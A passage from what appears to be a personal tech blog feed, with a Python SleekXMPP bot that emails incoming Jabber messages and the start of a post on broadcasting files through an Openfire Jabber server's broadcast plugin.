</span><span class='line'>
</span><span class='line'>   <span class="c"># Mail the message Received</span>
</span><span class='line'>   <span class="n">message</span> <span class="o">=</span> <span class="n">Message</span><span class="p">(</span><span class="n">From</span><span class="o">=</span><span class="s">&quot;&#39;Jabber Email Service&#39; &lt;someone@domain.com&gt;&quot;</span><span class="p">,</span>
</span><span class='line'>         <span class="n">To</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;someone@domain.com&quot;</span><span class="p">],</span>
</span><span class='line'>         <span class="n">Subject</span><span class="o">=</span><span class="s">&quot;[Jabber Message Received] From: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">msg</span><span class="p">[</span><span class="s">&quot;from&quot;</span><span class="p">])</span>
</span><span class='line'>   <span class="n">themessage</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="s">&quot;body&quot;</span><span class="p">]</span>
</span><span class='line'>   <span class="n">themessage</span> <span class="o">=</span> <span class="n">themessage</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;unicode_escape&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">,</span><span class="s">&#39;ignore&#39;</span><span class="p">)</span>
</span><span class='line'>   <span class="n">message</span><span class="o">.</span><span class="n">Body</span> <span class="o">=</span> <span class="n">themessage</span>
</span><span class='line'>
</span><span class='line'>   <span class="n">sender</span> <span class="o">=</span> <span class="n">Mailer</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">)</span>
</span><span class='line'>   <span class="n">sender</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>A complete modified example that includes the above changes:</p>

<figure class='code'><figcaption><span>Shameless SleekXMPP modification of the echobot</span><a href='http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c"># -*- coding: utf-8 -*-</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    SleekXMPP: The Sleek XMPP Library</span>
</span><span class='line'><span class="sd">    Copyright (C) 2010  Nathanael C. Fritz</span>
</span><span class='line'><span class="sd">    This file is part of SleekXMPP.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    See the file LICENSE for copying permission.</span>
</span><span class='line'><span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">logging</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">getpass</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">optparse</span> <span class="kn">import</span> <span class="n">OptionParser</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">mailer</span> <span class="kn">import</span> <span class="n">Mailer</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">mailer</span> <span class="kn">import</span> <span class="n">Message</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sleekxmpp</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Python versions before 3.0 do not use UTF-8 encoding</span>
</span><span class='line'><span class="c"># by default. To ensure that Unicode is handled properly</span>
</span><span class='line'><span class="c"># throughout SleekXMPP, we will set the default encoding</span>
</span><span class='line'><span class="c"># ourselves to UTF-8.</span>
</span><span class='line'><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">version_info</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">):</span>
</span><span class='line'>    <span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;utf8&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="nb">raw_input</span> <span class="o">=</span> <span class="nb">input</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">EchoBot</span><span class="p">(</span><span class="n">sleekxmpp</span><span class="o">.</span><span class="n">ClientXMPP</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    A simple SleekXMPP bot that will echo messages it</span>
</span><span class='line'><span class="sd">    receives, along with a short thank you message.</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">jid</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
</span><span class='line'>        <span class="n">sleekxmpp</span><span class="o">.</span><span class="n">ClientXMPP</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">jid</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The session_start event will be triggered when</span>
</span><span class='line'>        <span class="c"># the bot establishes its connection with the server</span>
</span><span class='line'>        <span class="c"># and the XML streams are ready for use. We want to</span>
</span><span class='line'>        <span class="c"># listen for this event so that we we can initialize</span>
</span><span class='line'>        <span class="c"># our roster.</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">add_event_handler</span><span class="p">(</span><span class="s">&quot;session_start&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">start</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># The message event is triggered whenever a message</span>
</span><span class='line'>        <span class="c"># stanza is received. Be aware that that includes</span>
</span><span class='line'>        <span class="c"># MUC messages and error messages.</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">add_event_handler</span><span class="p">(</span><span class="s">&quot;message&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">message</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">        Process the session_start event.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">        Typical actions for the session_start event are</span>
</span><span class='line'><span class="sd">        requesting the roster and broadcasting an initial</span>
</span><span class='line'><span class="sd">        presence stanza.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">        Arguments:</span>
</span><span class='line'><span class="sd">            event -- An empty dictionary. The session_start</span>
</span><span class='line'><span class="sd">                     event does not provide any additional</span>
</span><span class='line'><span class="sd">                     data.</span>
</span><span class='line'><span class="sd">        &quot;&quot;&quot;</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">send_presence</span><span class="p">()</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">get_roster</span><span class="p">()</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">nick</span> <span class="o">=</span> <span class="s">&quot;jabberMailBot&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">        Process incoming message stanzas. Be aware that this also</span>
</span><span class='line'><span class="sd">        includes MUC messages and error messages. It is usually</span>
</span><span class='line'><span class="sd">        a good idea to check the messages&#39;s type before processing</span>
</span><span class='line'><span class="sd">        or sending replies.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">        Arguments:</span>
</span><span class='line'><span class="sd">            msg -- The received message stanza. See the documentation</span>
</span><span class='line'><span class="sd">                   for stanza objects and the Message stanza to see</span>
</span><span class='line'><span class="sd">                   how it may be used.</span>
</span><span class='line'><span class="sd">        &quot;&quot;&quot;</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">msg</span><span class="p">[</span><span class="s">&#39;type&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;chat&#39;</span><span class="p">,</span> <span class="s">&#39;normal&#39;</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;Received Message:</span><span class="se">\n</span><span class="si">%(body)s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">msg</span>
</span><span class='line'>
</span><span class='line'>            <span class="c"># Mail the message Received</span>
</span><span class='line'>            <span class="n">message</span> <span class="o">=</span> <span class="n">Message</span><span class="p">(</span><span class="n">From</span><span class="o">=</span><span class="s">&quot;&#39;Jabber Email Service&#39; &lt;someone@domain.com&gt;&quot;</span><span class="p">,</span>
</span><span class='line'>                  <span class="n">To</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;someone@domain.com&quot;</span><span class="p">],</span>
</span><span class='line'>                  <span class="n">Subject</span><span class="o">=</span><span class="s">&quot;[Jabber Message Received] From: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">msg</span><span class="p">[</span><span class="s">&quot;from&quot;</span><span class="p">])</span>
</span><span class='line'>            <span class="n">themessage</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="s">&quot;body&quot;</span><span class="p">]</span>
</span><span class='line'>            <span class="n">themessage</span> <span class="o">=</span> <span class="n">themessage</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;unicode_escape&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">,</span><span class="s">&#39;ignore&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="n">message</span><span class="o">.</span><span class="n">Body</span> <span class="o">=</span> <span class="n">themessage</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">sender</span> <span class="o">=</span> <span class="n">Mailer</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sender</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="c"># Setup the command line arguments.</span>
</span><span class='line'>    <span class="n">optp</span> <span class="o">=</span> <span class="n">OptionParser</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Output verbosity options.</span>
</span><span class='line'>    <span class="n">optp</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-q&#39;</span><span class="p">,</span> <span class="s">&#39;--quiet&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;set logging to ERROR&#39;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_const&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&#39;loglevel&#39;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">const</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
</span><span class='line'>    <span class="n">optp</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-d&#39;</span><span class="p">,</span> <span class="s">&#39;--debug&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;set logging to DEBUG&#39;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_const&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&#39;loglevel&#39;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">const</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
</span><span class='line'>    <span class="n">optp</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&#39;-v&#39;</span><span class="p">,</span> <span class="s">&#39;--verbose&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;set logging to COMM&#39;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">action</span><span class="o">=</span><span class="s">&#39;store_const&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&#39;loglevel&#39;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">const</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># JID and password options.</span>
</span><span class='line'>    <span class="n">optp</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&quot;-j&quot;</span><span class="p">,</span> <span class="s">&quot;--jid&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&quot;jid&quot;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">help</span><span class="o">=</span><span class="s">&quot;JID to use&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">optp</span><span class="o">.</span><span class="n">add_option</span><span class="p">(</span><span class="s">&quot;-p&quot;</span><span class="p">,</span> <span class="s">&quot;--password&quot;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">help</span><span class="o">=</span><span class="s">&quot;password to use&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">opts</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">optp</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Setup logging.</span>
</span><span class='line'>    <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">opts</span><span class="o">.</span><span class="n">loglevel</span><span class="p">,</span>
</span><span class='line'>                        <span class="n">format</span><span class="o">=</span><span class="s">&#39;</span><span class="si">%(levelname)-8s</span><span class="s"> </span><span class="si">%(message)s</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">opts</span><span class="o">.</span><span class="n">jid</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="n">opts</span><span class="o">.</span><span class="n">jid</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Username: &quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">opts</span><span class="o">.</span><span class="n">password</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="n">opts</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getpass</span><span class="p">(</span><span class="s">&quot;Password: &quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Setup the EchoBot and register plugins. Note that while plugins may</span>
</span><span class='line'>    <span class="c"># have interdependencies, the order in which you register them does</span>
</span><span class='line'>    <span class="c"># not matter.</span>
</span><span class='line'>    <span class="n">xmpp</span> <span class="o">=</span> <span class="n">EchoBot</span><span class="p">(</span><span class="n">opts</span><span class="o">.</span><span class="n">jid</span><span class="p">,</span> <span class="n">opts</span><span class="o">.</span><span class="n">password</span><span class="p">)</span>
</span><span class='line'>    <span class="n">xmpp</span><span class="o">.</span><span class="n">register_plugin</span><span class="p">(</span><span class="s">&#39;xep_0030&#39;</span><span class="p">)</span> <span class="c"># Service Discovery</span>
</span><span class='line'>    <span class="n">xmpp</span><span class="o">.</span><span class="n">register_plugin</span><span class="p">(</span><span class="s">&#39;xep_0004&#39;</span><span class="p">)</span> <span class="c"># Data Forms</span>
</span><span class='line'>    <span class="n">xmpp</span><span class="o">.</span><span class="n">register_plugin</span><span class="p">(</span><span class="s">&#39;xep_0060&#39;</span><span class="p">)</span> <span class="c"># PubSub</span>
</span><span class='line'>    <span class="n">xmpp</span><span class="o">.</span><span class="n">register_plugin</span><span class="p">(</span><span class="s">&#39;xep_0199&#39;</span><span class="p">)</span> <span class="c"># XMPP Ping</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># If you are working with an OpenFire server, you may need</span>
</span><span class='line'>    <span class="c"># to adjust the SSL version used:</span>
</span><span class='line'>    <span class="c"># xmpp.ssl_version = ssl.PROTOCOL_SSLv3</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># If you want to verify the SSL certificates offered by a server:</span>
</span><span class='line'>    <span class="c"># xmpp.ca_certs = &quot;path/to/ca/cert&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Connect to the XMPP server and start processing XMPP stanzas.</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">xmpp</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
</span><span class='line'>        <span class="c"># If you do not have the dnspython library installed, you will need</span>
</span><span class='line'>        <span class="c"># to manually specify the name of the server if it does not match</span>
</span><span class='line'>        <span class="c"># the one in the JID. For example, to use Google Talk you would</span>
</span><span class='line'>        <span class="c"># need to use:</span>
</span><span class='line'>        <span class="c">#</span>
</span><span class='line'>        <span class="c"># if xmpp.connect((&#39;talk.google.com&#39;, 5222)):</span>
</span><span class='line'>        <span class="c">#     ...</span>
</span><span class='line'>        <span class="n">xmpp</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&quot;Done&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&quot;Unable to connect.&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>So how do I actually use this thing I just saw?</h3>

<p>Take the complete example and save it to a file like <code>bot.py</code>. Then, run it!
The complete example will echo the message just before it attempts to mail it. You can comment out line <strong>86</strong> to stop this from happening and run the script with the <code>-q</code> argument once you are happy all is working.</p>

<figure class='code'><figcaption><span>sample run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% python bot.py -j <span class="s2">&quot;myEmailbot@myJabberServer.local&quot;</span>
</span><span class='line'>Password:
</span><span class='line'>INFO     Negotiating TLS
</span><span class='line'>INFO     Using SSL version: 3
</span><span class='line'>INFO     CERT: Time <span class="k">until </span>certificate expiration: 952 days, 6:46:01.014041
</span><span class='line'>
</span><span class='line'>Received Message:
</span><span class='line'>This is a <span class="nb">test </span>message that will be mailed :D
</span></code></pre></td></tr></table></div></figure>


<h3>Things to note.</h3>

<ul>
<li>Even though the script allows you to specify a <code>-p</code> argument, I would highly discourage the usage of this. Any person that has access to your machine, be it legitimate or not, would then see your bot&rsquo;s process, with the password in the <code>ps</code> output!</li>
<li>Ensure the SMTP server specified in line <strong>96</strong> of the complete example allows yo to relay! Change it if needed.</li>
</ul>


<h3>Test! :D</h3>

<p>Send your bot a message and see if your mail arrives ^^</p>

<p><strong>EDIT</strong>: Modify the message encoding to ASCII as the utf8 stuff seems to barf out sometimes :|</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How To: Extremely simple python Jabber Broadcast Bot]]></title>
    <link href="http://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot/"/>
    <updated>2013-05-25T10:12:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/05/25/how-to-extremely-simple-python-jabber-broadcast-bot</id>
    <content type="html"><![CDATA[<h3>Bots! Bots! Bots!</h3>

<p>Generally speaking, a &lsquo;&#8217;bot&rsquo;&lsquo; is something that like <em>does work for you</em>. But, for this purpose, the need for a jabber bot came from the fact that I had to deal with a lot of email on a daily basis. This large amount of mail sometimes would cause me to completely miss critical mail alerts. Realising later that I could have prevented a catastrophe if I didn&rsquo;t miss that <strong>one</strong> email was just not on anymore. So, I started investigating ways to get the <em>important</em> stuff delivered faster.</p>

<p>As a team at work, we have long gone dropped the whole Skype group chat thing for our own Jabber server. My privacy related concerns back then was recently heightened <a href="http://lists.randombit.net/pipermail/cryptography/2013-May/004224.html">here</a> when a trap URL received a HEAD request from <strong>65.52.100.214</strong>. The user that received the URL in a chat was under strict instructions not to actually click it&hellip;</p>

<!--more-->


<h3>So, how do we do this?</h3>

<p>We implemented a <a href="http://www.igniterealtime.org/projects/openfire/">Openfire Server</a> that was really easy to setup and get going. Whats really nice about this Jabber server is that it supports plugins, some of which you can simply install via the web interface.</p>

<p>One such plugin that was installed is called the <a href="http://www.igniterealtime.org/projects/openfire/plugins/broadcast/readme.html">broadcast</a> plugin. This allows you to broadcast a message to all users on the server or those in defined groups.</p>

<p><img src="http://i.imgur.com/6i8WhgR.png">
Once this plugin is installed, some minor configuration is required to allow the broadcasting feature to work. In no way is this an extensive guide on the power of the plugin, but for the purpose of this post well just quickly rush over it.</p>

<p>Head over to <em>Server</em> &ndash;> <em>Server Manager</em> &ndash;> <em>System Properties</em>. From here you need to add the fields that are not there with the <strong>plugin.broadcast.</strong> prefix. Don&rsquo;t worry if they are not there, just add them.</p>

<p><img src="http://i.imgur.com/XmU4d98.png"></p>

<p>The above is just a sample of a working configuration. Feel free to play around more with different setups.</p>

<p>With everything configured, you should now be able to send a message to something like <em>all@broadcast.jabber.server</em>. In my configuration, <em>plugin.broadcast.all2offline</em> is set to <strong>true</strong>. So, when a message is broadcasted and I was offline, I&rsquo;ll receive the broadcast as soon as I&rsquo;m back :)</p>

<h3>Introducing jabbersend.py</h3>

<p>With our jabber server now configured and working, we are ready to start automating things. From here we need two things. Something that will broadcast for us, and something <em>to</em> broadcast. The <em>what to broadcast</em> is entirely up to you, as the script will accept a text file to broadcast.</p>

<p>The only dependency you probably need to satisfy will be <code>xmpp</code>. This should be easily doable with something like <code>easy_install xmpp</code></p>

<figure class='code'><figcaption><span>Send a Jabber Message from a file</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">xmpp</span><span class="o">,</span><span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="c"># check the received arguments</span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Syntax: jabbersend.py JID textfile&quot;</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># set the values to work with and read the file</span>
